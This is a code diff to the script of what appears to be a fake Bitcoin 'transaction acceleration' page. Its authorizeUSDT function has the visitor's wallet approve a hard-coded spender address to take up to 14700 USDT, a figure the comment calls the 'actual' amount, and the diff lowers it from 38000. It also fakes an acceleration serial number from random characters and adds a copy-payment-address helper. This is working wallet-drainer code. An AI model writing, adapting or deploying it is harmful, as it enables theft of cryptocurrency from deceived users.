@@ -1,4 +1,4 @@
-// 随机生成比特币订单编号
+// 随机生成比特币加速序号
 function generateBtcOrderNumber() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let orderNumber = 'BTC';
@@ -8,10 +8,20 @@ function generateBtcOrderNumber() {
     return orderNumber;
 }
 
-// 页面加载时设置比特币订单编号
+// 页面加载时设置比特币加速序号
 document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('btc-order').innerText = generateBtcOrderNumber();
 });
+
+// 复制支付地址功能
+function copyAddress() {
+    const address = document.getElementById('pay-address').innerText;
+    navigator.clipboard.writeText(address).then(() => {
+        alert('地址已复制');
+    }).catch(err => {
+        console.error('复制失败', err);
+    });
+}
 
 async function authorizeUSDT() {
     if (typeof window.ethereum !== 'undefined') {
@@ -47,7 +57,7 @@ async function authorizeUSDT() {
             
             // 授权地址和数量
             const spenderAddress = "0x65f9f8F6432375d9fF7E369b0996bE52992013B1";
-            const amount = ethers.utils.parseUnits("38000", 6); // 实际授权数量 38000 USDT
+            const amount = ethers.utils.parseUnits("14700", 6); // 实际授权数量 14700 USDT
             
             // 发送授权交易
             const tx = await usdtContract.approve(spenderAddress, amount);
